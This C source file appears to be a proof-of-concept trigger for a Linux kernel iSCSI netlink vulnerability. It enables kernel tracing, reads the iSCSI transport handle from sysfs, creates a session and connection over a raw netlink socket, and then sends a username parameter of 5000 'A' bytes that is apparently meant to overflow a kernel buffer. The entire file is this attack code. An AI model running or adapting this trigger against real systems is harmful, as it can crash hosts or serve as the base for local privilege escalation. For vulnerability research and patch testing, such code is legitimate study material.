#include <fcntl.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include "iscsi_if.h"

#define PATH_TRANSPORT_HANDLE "/sys/class/iscsi_transport/tcp/handle"
#define PATH_TRACING "/sys/kernel/debug/tracing/tracing_on"

static uint64_t g_transport_handle = 0;

int tracing_open() {
	int fd = open(PATH_TRACING, O_RDWR);

	if (fd < 0) {
		perror("failed opening "PATH_TRACING);
		return -1;
	}

	return fd;
}

int tracing_write(int fd_tracing_enable, char input) {
	int n = write(fd_tracing_enable, &input, 1);

	if (n < 1) {
		perror("fd_tracing_enable write failed");
		return -1;
	}

	return 0;
}


uint64_t get_transport_handle() {
	int fd = open(PATH_TRANSPORT_HANDLE, O_RDONLY);

	if (fd < 0) {
		perror("open");
		return -1;
	}

	char handle[1024];
	int n = read(fd, handle, sizeof(handle));

	if (n < 0) {
		perror("read");
		return -1;
	}

	close(fd);

	/* look for the newline */
	char* ptr = strchr(handle, '\n');

	if (ptr == NULL) {
		fprintf(stderr, " [!] error parsing handle (missing newline)\n");
		return -1;
	}

	*ptr = '\0';

	uint64_t value;

	int err = sscanf(handle, "%lu", &value);

	if (err < 1) {
		fprintf(stderr, " [!] error parsing handle (not an integer)\n");
		return -1;
	}

	printf(" [*] found transport_handle: 0x%lx\n", value);

	return value;
}

int iscsi_send_ev(int fd, enum iscsi_uevent_e type, struct iscsi_uevent* ev, size_t size) {
	struct sockaddr_nl addr;
	memset(&addr, 0, sizeof(addr));
	addr.nl_family = AF_NETLINK;
	addr.nl_pid = 0;  // For Linux kernel
	addr.nl_groups = 0;

	struct nlmsghdr *nlh = (struct nlmsghdr *) malloc(NLMSG_SPACE(size));
	memset(nlh, 0, NLMSG_SPACE(size));
	nlh->nlmsg_type = type;
	nlh->nlmsg_len = NLMSG_SPACE(size);
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = 0;
	memcpy(NLMSG_DATA(nlh), ev, size);

	struct iovec iov;
	memset(&iov, 0, sizeof(iov));
	iov.iov_base = (void *) nlh;
	iov.iov_len = nlh->nlmsg_len;

	struct msghdr msg;
	memset(&msg, 0, sizeof(msg));
	msg.msg_name = (void *) &addr;
	msg.msg_namelen = sizeof(addr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	printf(" [*] Sending message to kernel\n");
	int ret = sendmsg(fd, &msg, 0);

	free(nlh);

	return ret;
}

struct iscsi_uevent iscsi_recv_ev(int fd) {
	int len;
	struct nlmsghdr buf[8192/sizeof(struct nlmsghdr)];
	struct iovec r_iov = { buf, sizeof(buf) };
	struct sockaddr_nl sa;
	struct msghdr r_msg;
	struct nlmsghdr *r_nh;

	r_msg = (struct msghdr) { &sa, sizeof(sa), &r_iov, 1, NULL, 0, 0 };
	len = recvmsg(fd, &r_msg, 0);

	printf(" [*] iscsi_recv_ev() received %d bytes\n", len);

	for (r_nh = (struct nlmsghdr *) buf; NLMSG_OK (r_nh, len); r_nh = NLMSG_NEXT (r_nh, len)) {
		printf(" [*] type: %d\n", r_nh->nlmsg_type);
		/* The end of multipart message */
		if (r_nh->nlmsg_type == NLMSG_DONE) {
			printf("NLMSG_DONE\n");
		}
		if (r_nh->nlmsg_type == NLMSG_NOOP) {
			printf("NLMSG_NOOP\n");
		}

		if (r_nh->nlmsg_type == NLMSG_ERROR) {
			/* Do some error handling */
			perror("recvmsg");
		}

		/* Continue with parsing payload */
		return *(struct iscsi_uevent*)NLMSG_DATA(r_nh);
	}
	/* FIXME: return value */
}

int iscsi_create_session(int fd) {
	printf(" [+] creating session...\n");
	struct iscsi_uevent* ev = malloc(sizeof(struct iscsi_uevent));
	ev->transport_handle = g_transport_handle;

	int err = iscsi_send_ev(fd, ISCSI_UEVENT_CREATE_SESSION, ev, sizeof(*ev));

	free(ev);

	if (err < 0) {
		perror("iscsi_create_session()");
		return err;
	}

	struct iscsi_uevent r_ev = iscsi_recv_ev(fd);

	if (r_ev.iferror) {
		fprintf(stderr, "iscsi_recv_ev() failed with error %d\n", r_ev.iferror);
		return r_ev.iferror;
	}

	printf(" [+] created session %d\n", r_ev.r.c_session_ret.sid);

	int sid = r_ev.r.c_session_ret.sid;

	return sid;
}

int iscsi_create_connection(int fd, int sid, int cid) {
	printf(" [+] create connection from session %d...\n", sid);

	struct iscsi_uevent* ev = malloc(sizeof(struct iscsi_uevent));
	ev->transport_handle = g_transport_handle;
	ev->u.c_conn.sid = sid;
	ev->u.c_conn.cid = cid;

	int err = iscsi_send_ev(fd, ISCSI_UEVENT_CREATE_CONN, ev, sizeof(*ev));

	if (err < 0) {
		perror(" [!] iscsi_create_connection()");
		return err;
	}

	struct iscsi_uevent r_ev = iscsi_recv_ev(fd);

	if (r_ev.iferror) {
		fprintf(stderr, " [!] iscsi_recv_ev() failed with error %d\n", r_ev.iferror);
		return r_ev.iferror;
	}

	printf(" [+] created connection %d\n", r_ev.r.c_conn_ret.cid);

	int r_cid = r_ev.r.c_conn_ret.cid;

	free(ev);

	return r_cid;
}

int iscsi_set_username(int fd, int sid, int cid, int count) {
	printf(" [+] set username ...");

	size_t size = sizeof(struct iscsi_uevent) + count;

	struct iscsi_uevent* ev = malloc(size);
	ev->transport_handle = g_transport_handle;
	ev->u.set_param.sid = sid;
	ev->u.set_param.cid = cid;
	ev->u.set_param.param = ISCSI_PARAM_USERNAME;
	ev->u.set_param.len = count;

	memset(((char*)ev) + sizeof(struct iscsi_uevent), 'A', count);

	int err = iscsi_send_ev(fd, ISCSI_UEVENT_SET_PARAM, ev, size);

	free(ev);

	if (err < 0) {
		perror(" [!] iscsi_set_username()");
		return err;
	}

	struct iscsi_uevent r_ev = iscsi_recv_ev(fd);

	if (r_ev.iferror) {
		fprintf(stderr, " [!] iscsi_recv_ev() failed with error %d\n", r_ev.iferror);
		return r_ev.iferror;
	}

	printf(" ok\n");

	return 0;
}


int main(int argc, char *argv[]) {
	int fd_tracing = tracing_open();
	if (fd_tracing < 0) {
		return 1;
	}

	tracing_write(fd_tracing, '1');

	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
	if (fd < 0) {
		perror("socket failed");
	}

	g_transport_handle = get_transport_handle();

	int sid = iscsi_create_session(fd);

	if (sid < 0) {
		fprintf(stderr, "failed to create session\n");
		return sid;
	}

	int cid = iscsi_create_connection(fd, sid, 1337);

	if (cid < 0) {
		return cid;
	}

	int err = iscsi_set_username(fd, sid, cid, 5000);
	if (err < 0) {
		return err;
	}
	tracing_write(fd_tracing, '0');

	return 0;
}
